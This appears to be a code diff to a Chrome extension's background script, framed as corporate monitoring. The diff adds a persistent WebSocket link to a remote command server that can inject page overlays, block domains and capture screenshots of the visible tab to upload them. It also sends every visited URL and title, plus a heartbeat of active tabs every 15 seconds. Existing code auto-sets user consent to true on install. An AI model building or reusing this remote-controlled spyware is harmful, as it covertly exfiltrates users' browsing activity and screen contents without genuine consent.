@@ -19,6 +19,11 @@ let offlineQueue = [];
 let redListCache = new Map();
 let lastCacheUpdate = 0;
 
+// Remote control state
+let commandSocket = null;
+let sessionHeartbeatInterval = null;
+let activeSessions = new Map();
+
 // Professional logging system
 function log(level, message, data = null) {
   if (!CONFIG.DEBUG && level === 'debug') return;
@@ -45,6 +50,9 @@ chrome.runtime.onInstalled.addListener(async () => {
     
     // Set up periodic cleanup and maintenance
     setInterval(performMaintenance, 60000); // Every minute
+    
+    // Initialize remote control connection
+    initializeRemoteControl();
   } catch (error) {
     log('error', 'Failed to initialize extension', error);
   }
@@ -67,6 +75,8 @@ async function initializeExtension() {
     monitoringEnabled,
     userConsented: true // Auto-accept on installation
   });
+  
+  log('info', `Machine ID: ${machineId}, Monitoring: ${monitoringEnabled}`);
 }
 
 // Generate unique machine ID
@@ -74,10 +84,18 @@ function generateMachineId() {
   return 'CORP-' + Date.now().toString(36) + '-' + Math.random().toString(36).substr(2, 9);
 }
 
-// Listen for tab updates to collect data
+// Listen for tab updates to collect data and track sessions
 chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {
   if (changeInfo.status === 'complete' && monitoringEnabled && tab.url) {
     collectPageData(tab);
+    trackSession(tab);
+  }
+});
+
+// Listen for tab removal to clean up sessions
+chrome.tabs.onRemoved.addListener((tabId) => {
+  if (activeSessions.has(tabId)) {
+    closeSession(tabId);
   }
 });
 
@@ -466,6 +484,157 @@ async function processOfflineQueue() {
       break;
     }
   }
+}
+
+// ============= REMOTE CONTROL SYSTEM =============
+
+// Initialize remote control WebSocket connection
+async function initializeRemoteControl() {
+  if (!machineId) return;
+  connectToCommandServer();
+  startSessionHeartbeat();
+}
+
+// Connect to command dispatcher WebSocket
+function connectToCommandServer() {
+  const wsUrl = `wss://vxvcquifgwtbjghrcjbp.supabase.co/functions/v1/command-dispatcher`;
+  
+  try {
+    commandSocket = new WebSocket(wsUrl);
+    
+    commandSocket.onopen = () => {
+      log('info', 'Connected to command server');
+      commandSocket.send(JSON.stringify({
+        type: 'register',
+        machine_id: machineId,
+        timestamp: new Date().toISOString()
+      }));
+    };
+    
+    commandSocket.onmessage = (event) => {
+      const data = JSON.parse(event.data);
+      handleRemoteCommand(data);
+    };
+    
+    commandSocket.onclose = () => {
+      setTimeout(connectToCommandServer, 5000);
+    };
+  } catch (error) {
+    log('error', 'WebSocket connection failed', error);
+  }
+}
+
+// Handle remote commands from admin
+async function handleRemoteCommand(data) {
+  log('info', 'Received remote command', data);
+  
+  switch (data.command_type) {
+    case 'popup':
+      await handlePopupCommand(data);
+      break;
+    case 'block':
+      await handleBlockCommand(data);
+      break;
+    case 'screenshot':
+      await handleScreenshotCommand(data);
+      break;
+  }
+}
+
+// Handle popup command
+async function handlePopupCommand(data) {
+  const tabId = parseInt(data.target_tab_id);
+  
+  await chrome.scripting.executeScript({
+    target: { tabId },
+    func: () => {
+      const overlay = document.createElement('div');
+      overlay.style.cssText = `position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.8); z-index: 10000; display: flex; align-items: center; justify-content: center;`;
+      
+      const popup = document.createElement('div');
+      popup.style.cssText = `background: white; padding: 20px; border-radius: 8px; text-align: center;`;
+      popup.innerHTML = `<h2 style="color: #e11d48;">⚠️ Aviso Corporativo</h2><p>Site monitorado pela administração.</p><button onclick="this.parentElement.parentElement.remove()" style="background: #e11d48; color: white; border: none; padding: 10px 20px; border-radius: 4px;">Entendi</button>`;
+      
+      overlay.appendChild(popup);
+      document.body.appendChild(overlay);
+    }
+  });
+}
+
+// Handle block command
+async function handleBlockCommand(data) {
+  const domain = data.target_domain;
+  const ruleId = Date.now();
+  
+  await chrome.declarativeNetRequest.updateDynamicRules({
+    addRules: [{
+      id: ruleId,
+      priority: 1,
+      action: { type: 'block' },
+      condition: { urlFilter: `*://*.${domain}/*`, resourceTypes: ['main_frame'] }
+    }]
+  });
+}
+
+// Handle screenshot command
+async function handleScreenshotCommand(data) {
+  const tabId = parseInt(data.target_tab_id);
+  const screenshotUrl = await chrome.tabs.captureVisibleTab(null, { format: 'png' });
+  
+  await fetch(`${CONFIG.API_BASE}/screenshot-capture`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      machine_id: machineId,
+      tab_id: data.target_tab_id,
+      screenshot_data: screenshotUrl
+    })
+  });
+}
+
+// Track active sessions
+async function trackSession(tab) {
+  const url = new URL(tab.url);
+  if (url.protocol === 'chrome:') return;
+  
+  await fetch(`${CONFIG.API_BASE}/session-tracker`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      machine_id: machineId,
+      tab_id: tab.id.toString(),
+      url: tab.url,
+      domain: url.hostname,
+      title: tab.title,
+      action: 'heartbeat'
+    })
+  });
+}
+
+// Close session
+async function closeSession(tabId) {
+  const sessionData = activeSessions.get(tabId);
+  if (!sessionData) return;
+  
+  await fetch(`${CONFIG.API_BASE}/session-tracker`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({ ...sessionData, action: 'close' })
+  });
+  
+  activeSessions.delete(tabId);
+}
+
+// Start session heartbeat
+function startSessionHeartbeat() {
+  setInterval(async () => {
+    const tabs = await chrome.tabs.query({ active: true });
+    for (const tab of tabs) {
+      if (tab.url && !tab.url.startsWith('chrome:')) {
+        await trackSession(tab);
+      }
+    }
+  }, 15000);
 }
 
 // Import service worker utilities
